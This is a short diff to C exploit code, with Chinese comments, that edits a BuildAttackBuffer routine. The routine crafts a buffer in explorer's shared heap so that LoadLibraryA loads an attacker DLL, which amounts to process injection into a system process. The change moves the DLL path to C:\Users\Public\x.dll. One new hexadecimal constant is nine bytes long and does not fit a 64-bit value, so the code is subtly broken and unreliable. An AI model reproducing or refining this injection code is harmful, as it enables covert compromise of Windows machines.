@@ -318,15 +318,16 @@ PVOID BuildAttackBuffer(HWND window, PVOID explorerSharedHeap, SIZE_T windowBuff
     SET_LONG(7);
     SET_LONG(loadLibraryAddr);  // LoadLibraryA 函数地址
 
-    // 写入要加载的 DLL 路径（c:\\x.dll）
-    SET_LONG(0x6c6c642e785c3a63);  // "c:\\x.dll"
-    SET_LONG(0);
+    // 写入要加载的 DLL 路径（C:\Users\Public\x.dll）
+    SET_LONG(0x73726573555C3A43ULL);  // "C:\Users"
+    SET_LONG(0x5C6369636C6275505CULL);  // "\Public\"
+    SET_LONG(0x0000006C6C642E78ULL);    // "x.dll\0\0\0"
 
     #undef SET_LONG
 
     printf("    [+] 攻击缓冲区构建完成\n");
     printf("        LoadLibraryA: 0x%p\n", loadLibraryAddr);
-    printf("        目标 DLL: c:\\x.dll\n");
+    printf("        目标 DLL: C:\\Users\\Public\\x.dll\n");
 
     return (PVOID)((SIZE_T)explorerSharedHeap + windowBufferOffset);
 }
